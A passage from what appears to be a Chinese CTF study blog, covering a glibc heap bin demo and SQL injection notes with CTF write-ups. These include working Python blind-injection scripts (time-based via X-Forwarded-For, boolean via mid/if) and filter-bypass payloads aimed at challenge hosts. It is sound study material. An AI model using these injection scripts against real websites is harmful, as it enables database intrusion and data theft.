class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x300</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//防止p1释放并consolidate到smallbins中之后，再释放p2导致p1和p2合并，合并之后又被放入unsortedbin中</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>); </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);<span class=\"comment\">//防止p2被释放之后与topchunk合并</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//为了程序打断点使用，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x700</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(temp);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>先看堆信息</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216164710877.png\" alt=\"image-20201216164710877\"></p>\n<p>释放p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216164747866.png\" alt=\"image-20201216164747866\"></p>\n<p>分配0x700 由于unsorted bin中的chunk不够 所以直接从top chunk中分割</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216164913709.png\" alt=\"image-20201216164913709\"></p>\n<p>free tmp和p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216165109899.png\" alt=\"image-20201216165109899\"></p>\n<p>重点来看最后一步 这里，malloc(0x200)，此时malloc会切割smallbins中的p1，并产生last remainder（0x602250），并把last remainder放入到unsortedbin中。由于切割chunk并产生last remainder会发生consolidate，所以unsortedbin中的p2从unsortedbin中整理到smallbins中（由于此种情况的consolidate不会整理fastbins中的chunk，所以fastbins中的chunk仍然在fastbins中）</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216165224983.png\" alt=\"image-20201216165224983\"></p>\n</blockquote>\n","categories":["PWN"],"tags":["PWN"]},{"title":"SQL注入","url":"https://pz1o.top/2020/12/09/SQL注入/","content":"<p>我就单纯想把这些东西存下来</p>\n<h1 id=\"基础学习\"><a href=\"#基础学习\" class=\"headerlink\" title=\"基础学习\"></a>基础学习</h1><h2 id=\"1-SQL注入的分类\"><a href=\"#1-SQL注入的分类\" class=\"headerlink\" title=\"1.SQL注入的分类\"></a>1.SQL注入的分类</h2><ul>\n<li><h3 id=\"基于从服务器接收到的响应\"><a href=\"#基于从服务器接收到的响应\" class=\"headerlink\" title=\"基于从服务器接收到的响应\"></a>基于从服务器接收到的响应</h3><ul>\n<li><h4 id=\"基于错误的SQL注入\"><a href=\"#基于错误的SQL注入\" class=\"headerlink\" title=\"基于错误的SQL注入\"></a>基于错误的SQL注入</h4></li>\n<li><h4 id=\"联合查询的类型\"><a href=\"#联合查询的类型\" class=\"headerlink\" title=\"联合查询的类型\"></a>联合查询的类型</h4></li>\n<li><h4 id=\"堆查询注射\"><a href=\"#堆查询注射\" class=\"headerlink\" title=\"堆查询注射\"></a>堆查询注射</h4></li>\n<li><h4 id=\"SQL盲注\"><a href=\"#SQL盲注\" class=\"headerlink\" title=\"SQL盲注\"></a>SQL盲注</h4><ul>\n<li><h5 id=\"基于布尔SQL盲注\"><a href=\"#基于布尔SQL盲注\" class=\"headerlink\" title=\"基于布尔SQL盲注\"></a>基于布尔SQL盲注</h5></li>\n<li><h5 id=\"基于时间的SQL盲注\"><a href=\"#基于时间的SQL盲注\" class=\"headerlink\" title=\"基于时间的SQL盲注\"></a>基于时间的SQL盲注</h5></li>\n<li><h5 id=\"基于报错的SQL盲注\"><a href=\"#基于报错的SQL盲注\" class=\"headerlink\" title=\"基于报错的SQL盲注\"></a>基于报错的SQL盲注</h5></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><h3 id=\"基于如何处理输入的SQL查询\"><a href=\"#基于如何处理输入的SQL查询\" class=\"headerlink\" title=\"基于如何处理输入的SQL查询\"></a>基于如何处理输入的SQL查询</h3><ul>\n<li><h5 id=\"基于字符串\"><a href=\"#基于字符串\" class=\"headerlink\" title=\"基于字符串\"></a>基于字符串</h5></li>\n<li><h5 id=\"数字或整数\"><a href=\"#数字或整数\" class=\"headerlink\" title=\"数字或整数\"></a>数字或整数</h5></li>\n</ul>\n</li>\n<li><h3 id=\"基于程度和顺序的注入\"><a href=\"#基于程度和顺序的注入\" class=\"headerlink\" title=\"基于程度和顺序的注入\"></a>基于程度和顺序的注入</h3><ul>\n<li><h5 id=\"一阶注射\"><a href=\"#一阶注射\" class=\"headerlink\" title=\"一阶注射\"></a>一阶注射</h5></li>\n<li><h5 id=\"二阶注射\"><a href=\"#二阶注射\" class=\"headerlink\" title=\"二阶注射\"></a>二阶注射</h5></li>\n</ul>\n</li>\n<li><h3 id=\"基于注入点的位置上的\"><a href=\"#基于注入点的位置上的\" class=\"headerlink\" title=\"基于注入点的位置上的\"></a>基于注入点的位置上的</h3><ul>\n<li><h5 id=\"通过用户输入的表单域的注射\"><a href=\"#通过用户输入的表单域的注射\" class=\"headerlink\" title=\"通过用户输入的表单域的注射\"></a>通过用户输入的表单域的注射</h5></li>\n<li><h5 id=\"通过cookie注射\"><a href=\"#通过cookie注射\" class=\"headerlink\" title=\"通过cookie注射\"></a>通过cookie注射</h5></li>\n<li><h5 id=\"通过服务器变量\"><a href=\"#通过服务器变量\" class=\"headerlink\" title=\"通过服务器变量\"></a>通过服务器变量</h5></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"2-基础函数与逻辑\"><a href=\"#2-基础函数与逻辑\" class=\"headerlink\" title=\"2.基础函数与逻辑\"></a>2.基础函数与逻辑</h2><h3 id=\"1-基础函数\"><a href=\"#1-基础函数\" class=\"headerlink\" title=\"1.基础函数\"></a>1.基础函数</h3><p>​    concat(str1,str2)   ——无分隔连接字符串</p>\n<p>​    concat_ws(separator,str1,str2)   ——含有分隔符连接字符串</p>\n<p>​    group_concat(str1,str2)  ——以逗号分隔每一条数据，连接一个组的字符串</p>\n<h3 id=\"2-基础逻辑\"><a href=\"#2-基础逻辑\" class=\"headerlink\" title=\"2.基础逻辑\"></a>2.基础逻辑</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id=$_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">$sql=<span class=\"string\">\"select * from users where id='$id' limit 0,1\"</span>;</span><br></pre></td></tr></table></figure>\n<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用—+ 或者 #（%23）。</p>\n<p>limit 从0开始，至少1个数据</p>\n<p>limit 10  至少10个数据</p>\n<h3 id=\"3-union操作符的用法\"><a href=\"#3-union操作符的用法\" class=\"headerlink\" title=\"3.union操作符的用法\"></a>3.union操作符的用法</h3><p>union操作符用于合并两个或多个select语句的结果集。但注意的是，select的语句必须有相同数量的列，列也有相同的类型。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> column_names <span class=\"keyword\">from</span> table_name1 <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> column_names <span class=\"keyword\">from</span> table_name2;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-一般操作\"><a href=\"#4-一般操作\" class=\"headerlink\" title=\"4.一般操作\"></a>4.一般操作</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> information_schema; //进入系统数据库</span><br><span class=\"line\"><span class=\"keyword\">show</span> <span class=\"keyword\">tables</span>; </span><br><span class=\"line\"><span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema = <span class=\"string\">'myclass'</span>; //搜索当数据库名为myclass中各表的名字</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png\" alt=\"image-20200502160256194\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata; //猜数据库</span><br><span class=\"line\"><span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">'数据库名'</span>; //猜某库的数据表</span><br><span class=\"line\"><span class=\"keyword\">select</span> column_name <span class=\"keyword\">form</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">'表名'</span>; //猜某表的数据段</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> *; //猜数据段的内容</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png\" alt=\"image-20200502161927164_WPS图片\"></p>\n<h2 id=\"3-盲注的讲解（先看1-4之后再来看）\"><a href=\"#3-盲注的讲解（先看1-4之后再来看）\" class=\"headerlink\" title=\"3.盲注的讲解（先看1-4之后再来看）\"></a>3.盲注的讲解（先看1-4之后再来看）</h2><h3 id=\"1-基于布尔的SQL盲注\"><a href=\"#1-基于布尔的SQL盲注\" class=\"headerlink\" title=\"1.基于布尔的SQL盲注\"></a>1.基于布尔的SQL盲注</h3><h3 id=\"2-基于时间的SQL盲注\"><a href=\"#2-基于时间的SQL盲注\" class=\"headerlink\" title=\"2.基于时间的SQL盲注\"></a>2.基于时间的SQL盲注</h3><p>时间盲注和布尔盲注非常类似，但时间盲注是利用sleep()​和benchmark()等函数让mysql执行的时间变长。</p>\n<p>时间盲注多与IF(expr1,expr2,expr3)结合使用，如果expr1是true，则执行expr2，否则执行expr3</p>\n<h3 id=\"INSERT-INTO注入-case延时盲注\"><a href=\"#INSERT-INTO注入-case延时盲注\" class=\"headerlink\" title=\"INSERT INTO注入(case延时盲注)\"></a>INSERT INTO注入(case延时盲注)</h3><p>看了源码知道取xff头,并且explode过滤逗号。题目的源码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\">function getIp()&#123;</span><br><span class=\"line\">$ip &#x3D; &#39;&#39;;</span><br><span class=\"line\">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class=\"line\">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;获取请求的ip地址</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;将逗号过滤</span><br><span class=\"line\">return $ip_arr[0]; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$host&#x3D;&quot;localhost&quot;;</span><br><span class=\"line\">$user&#x3D;&quot;&quot;;</span><br><span class=\"line\">$pass&#x3D;&quot;&quot;;</span><br><span class=\"line\">$db&#x3D;&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$ip &#x3D; getIp();</span><br><span class=\"line\">echo &#39;your ip is :&#39;.$ip;</span><br><span class=\"line\">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class=\"line\">mysql_query($sql);</span><br></pre></td></tr></table></figure>\n<p>这道题是<strong>盲注</strong>题目说得也很明白，问题是怎么注入呢？这里有两个问题</p>\n<ul>\n<li>第一个是理解<code>insert...into</code>注入</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class=\"line\">&#x2F;&#x2F;这里主要结合sleep()进行注入</span><br><span class=\"line\">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class=\"line\">&#x2F;&#x2F;这样就插入了一条id&#x3D;1,name&#x3D;null的数据</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第二个是过滤逗号的，<strong>所以不能用<code>if(a,b,c)</code>应该用<code>case...when...then</code>同时常用的截取字符串函数<code>substr([str],[start],[len])</code>也有替代的<code>substr([str]from [strat] for [len])</code></strong></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case...when...then</span><br><span class=\"line\">简单case函数</span><br><span class=\"line\">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class=\"line\">\t\t\t\twhen &#39;2&#39; then &#39;nv&#39;</span><br><span class=\"line\">\t\t\t\telse &#39;qita&#39; end</span><br><span class=\"line\">case搜索函数</span><br><span class=\"line\">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class=\"line\">\t\t when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class=\"line\">\t\t else &#39;qita&#39; end</span><br></pre></td></tr></table></figure>\n<p>接下来只需要构造就可以了、</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class=\"line\">&#x2F;&#x2F;最后一个)用来闭合 #用来注释</span><br></pre></td></tr></table></figure>\n<p>接下来就可以写脚本了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">allString = <span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\"></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\">url = <span class=\"string\">\"http://123.206.87.240:8002/web15/\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> allString:</span><br><span class=\"line\">        payload = <span class=\"string\">\"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">        headers = &#123;<span class=\"string\">'x-forwarded-for'</span>:payload&#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.get(url = url,headers = headers,timeout = <span class=\"number\">3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ReadTimeout:</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">print(<span class=\"string\">\"flag is :&#123;\"</span> +flag+<span class=\"string\">\"&#125;\"</span>)</span><br><span class=\"line\">//数据库</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">库为web15</span><br><span class=\"line\">//表</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">表为client_ip,flag</span><br><span class=\"line\">//列</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">flag</span><br><span class=\"line\">//flag</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br></pre></td></tr></table></figure>\n<p>就可以得到flag了。</p>\n<blockquote>\n<p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p>\n</blockquote>\n<h3 id=\"多次（mid布尔盲注）\"><a href=\"#多次（mid布尔盲注）\" class=\"headerlink\" title=\"多次（mid布尔盲注）\"></a>多次（mid布尔盲注）</h3><p>主要学习一下<strong>异或注入</strong>判断过滤了哪些关键词</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">异或：1^1&#x3D;0，1^0&#x3D;1，0^1&#x3D;1，0^0&#x3D;0</span><br><span class=\"line\">这样当构造：?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class=\"line\">若返回正确页面的回显(There is nothing.)，则说明(length(&#39;and&#39;)&#x3D;0)为假;</span><br><span class=\"line\">若返回错误页面的回显(Error,Error,Error!)，则说明(length(&#39;and&#39;)&#x3D;0)为真。</span><br><span class=\"line\"></span><br><span class=\"line\">这里?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+均回显了Error,Error,Error!，说明(length(&#39;and&#39;)&#x3D;0)为真，那么可判断and被过滤了</span><br><span class=\"line\">同理可判断or、select、union也被过滤了</span><br><span class=\"line\">selselectect</span><br><span class=\"line\">uniunionon</span><br></pre></td></tr></table></figure>\n<p>注意的是：information中也有or</p>\n<p>继续学习盲注</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">url &#x3D; &#39;&#39;</span><br><span class=\"line\">data &#x3D; &#39;&#39;</span><br><span class=\"line\">for i in range(0,50):</span><br><span class=\"line\">    for j in dic:</span><br><span class=\"line\">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class=\"line\">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class=\"line\">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class=\"line\">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class=\"line\">        if &#39;Nobody&#39; not in r.text:</span><br><span class=\"line\">            data +&#x3D; j</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(data)</span><br></pre></td></tr></table></figure>\n<p>同时了解一下报错注入</p>\n<p>好像注入的时候是不需要select的，但在mysql中是需要的</p>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png\" alt=\"image-20200816164858101\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure>\n<h3 id=\"ctfhub（if布尔盲注）\"><a href=\"#ctfhub（if布尔盲注）\" class=\"headerlink\" title=\"ctfhub（if布尔盲注）\"></a>ctfhub（if布尔盲注）</h3><p>根据题目可知用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(a,b,c) a对就执行b，否则就执行c</span><br></pre></td></tr></table></figure>\n<p>这个题目正好是id=1,2会对，3就错所以我们把b=1或2，c为3</p>\n<p>接下来写脚本就可以</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class=\"line\">url &#x3D; &#39;&#39;</span><br><span class=\"line\">flag &#x3D; &#39;&#39;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">for i in range(0,50):</span><br><span class=\"line\">    for j in dic:</span><br><span class=\"line\">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class=\"line\">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class=\"line\">        if &#39;query_success&#39; in r.text:</span><br><span class=\"line\">            flag +&#x3D;j</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">#表</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class=\"line\">#列</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class=\"line\">#flag</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure>\n<p>不过中间好像是服务器会关闭所以我们可以分组扫描</p>\n<p>比如从1-30，30-50</p>\n<h3 id=\"ctfhub（if时间盲注）\"><a href=\"#ctfhub（if时间盲注）\" class=\"headerlink\" title=\"ctfhub（if时间盲注）\"></a>ctfhub（if时间盲注）</h3><p>和上一题一样直接写脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class=\"line\">url &#x3D; &#39;&#39;</span><br><span class=\"line\">flag &#x3D; &#39;&#39;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">for i in range(0,50):</span><br><span class=\"line\">    for j in dic:</span><br><span 